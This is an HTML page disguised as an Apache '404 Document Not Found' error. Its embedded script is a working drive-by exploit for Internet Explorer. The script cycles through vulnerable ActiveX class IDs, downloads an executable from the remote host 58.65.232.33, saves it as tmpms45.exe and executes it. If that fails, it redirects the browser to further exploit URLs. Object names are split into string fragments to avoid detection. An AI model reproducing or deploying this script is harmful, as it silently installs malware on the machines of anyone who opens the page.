<HTML>
<HEAD>
  <TITLE>404 error - Document Not Found</TITLE>
</HEAD>
<BODY><script language='javascript'>
function CreateO(o, n) {
var r = null;
try { eval('r = o.CreateObject(n)') }catch(e){}
if (! r) {try { eval('r = o.CreateObject(n, "")') }catch(e){}}
if (! r) {try { eval('r = o.CreateObject(n, "", "")') }catch(e){}}
if (! r) {try { eval('r = o.GetObject("", n)') }catch(e){}}
if (! r) {try { eval('r = o.GetObject(n, "")') }catch(e){}}
if (! r) {try { eval('r = o.GetObject(n)') }catch(e){}}
return(r);
}
function Go(a) {
var obj_msxml2 = CreateO(a,'msxm'+'l2.X'+'MLHT'+'TP'); if (! obj_msxml2) { var obj_msxml2 = CreateO(a,'MS'+'XML2.Serv'+'erXMLH'+'TTP');}
try {obj_msxml2.open('GET','http://58.65.232.33/counter.php?a=3&c=3',false);} catch(e) {return 0; }
try {obj_msxml2.send();} catch(e) {return 0;}
var obj_adodb = CreateO(a,'adod'+'b.stre'+'am');
obj_adodb.type = 1;
try{obj_adodb.open();} catch(e){return 0;}
try{obj_adodb.Write(obj_msxml2.responseBody);} catch(e){return 0;}
var fn = './/.'+'.//tmp'+'ms45.e'+'xe';
obj_adodb.SaveToFile(fn,2);
var s = CreateO(a, 'Shel'+'l.A'+'pplic'+'ation');
try{s.ShellExecute(fn);} catch(e){return 0;}
return 1;
}
var i = 0; var good=0;
var t = new Array(
'{BD96C556-65A3-11D0-983A-00C04FC29E30}','{BD96C556-65A3-11D0-983A-00C04FC29E36}',
'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}','{0006F033-0000-0000-C000-000000000046}','{0006F03A-0000-0000-C000-000000000046}','{6e32070a-766d-4ee6-879c-dc1fa91d2fc3}','{6414512B-B978-451D-A0D8-FCFDF33E833C}','{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}','{06723E09-F4C2-43c8-8358-09FCD1DB0766}','{639F725F-1B2D-4831-A9FD-874847682010}','{BA018599-1DB3-44f9-83B4-461454C84BF8}','{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}','{E8CCCDDF-CA28-496b-B050-6C07C962476B}',null);while (t[i]) {
var a = null;
if (t[i].substring(0,1) == '{') {
a = document.createElement('object');
a.setAttribute('classid', 'clsid:' + t[i].substring(1, t[i].length - 1));
} else {
try { a = new ActiveXObject(t[i]); } catch(e){}
}

if (a) {
if (Go(a)==1) {good=1; break;}
}
i++;}
if (good == 0) {temp=navigator.appVersion.split('MSIE'); version=parseFloat(temp[1]); if (version>=7) c = 'http://58.65.232.33/counter.php?b=5&k=1'; else  c='http://58.65.232.33/counter.php?b=4&k=1';
window.location = c;}</script>
The requested URL was not found on this server.<br><br><HR noshade='noshade'>Apache/1.3.31 Server at Port 80</body></html>